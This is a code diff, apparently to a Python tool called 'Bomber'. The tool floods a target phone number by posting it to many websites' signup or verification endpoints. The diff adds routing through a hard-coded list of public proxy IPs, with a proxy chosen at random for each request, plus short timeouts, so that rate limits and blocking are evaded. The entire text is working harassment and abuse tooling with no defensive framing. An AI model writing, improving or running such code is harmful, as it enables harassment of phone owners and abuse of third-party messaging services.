@@ -35,14 +35,14 @@ class Bomber:
         self.proxies:list = [
                         "http://45.77.185.45:3128",       
                         "http://1.10.133.47:80",
-                        "85.208.210.116:8085", 
-                        "45.159.23.214:8085", 
-                        "85.209.151.133:8085", 
-                        "91.89.89.11:8080", 
-                        "180.109.35.87:8060", 
-                        "85.209.150.234:8085", 
-                        "190.13.138.50:4153", 
-                        "77.37.208.119:55491"
+                        "http://85.208.210.116:8085", 
+                        "http://45.159.23.214:8085", 
+                        "http://85.209.151.133:8085", 
+                        "http://91.89.89.11:8080", 
+                        "http://180.109.35.87:8060", 
+                        "http://85.209.150.234:8085", 
+                        "http://190.13.138.50:4153", 
+                        "http://77.37.208.119:55491"
                        ] #Список прокси
 
         self.state_circles:int = 0 #State seconds
@@ -86,6 +86,7 @@ class Bomber:
                     break
 
             for v in sites.values():
+                print(random.choice(self.proxies))
                 if "json" in list(v.keys()) and not v["format"]:
                     dct = v["json"]
                     dct[v["arg"]] = v["plus"]+phone
@@ -93,10 +94,12 @@ class Bomber:
                         async with self.session.post(
                             url=v["url"], 
                             json=dct,  
-                            headers=self.user_agent
+                            headers=self.user_agent, 
+                            proxy=random.choice(self.proxies),
+                            timeout=2
                         ) as resp:pass
                         await asyncio.sleep(1) 
-                    except:pass
+                    except Exception as e:logger.error(e)
 
                 elif "data" in list(v.keys()) and not v["format"]:
                     dct = v["data"]
@@ -105,7 +108,9 @@ class Bomber:
                         async with self.session.post(
                             url=v["url"], 
                             data=dct,  
-                            headers=self.user_agent
+                            headers=self.user_agent, 
+                            proxy=random.choice(self.proxies), 
+                            timeout=2
                         ) as resp:pass
                         await asyncio.sleep(1)
                     except:pass
@@ -117,7 +122,9 @@ class Bomber:
                         async with self.session.post(
                             url=v["url"], 
                             params=dct,  
-                            headers=self.user_agent
+                            headers=self.user_agent, 
+                            proxy=random.choice(self.proxies), 
+                            timeout=2
                         ) as resp:pass
                         await asyncio.sleep(1)
                     except:pass                  
@@ -127,7 +134,9 @@ class Bomber:
                     try:
                         async with self.session.post(
                             url=url,  
-                            headers=self.user_agent
+                            headers=self.user_agent, 
+                            proxy=random.choice(self.proxies),
+                            timeout=2
                         ) as resp:pass
                         await asyncio.sleep(1)
                     except:pass
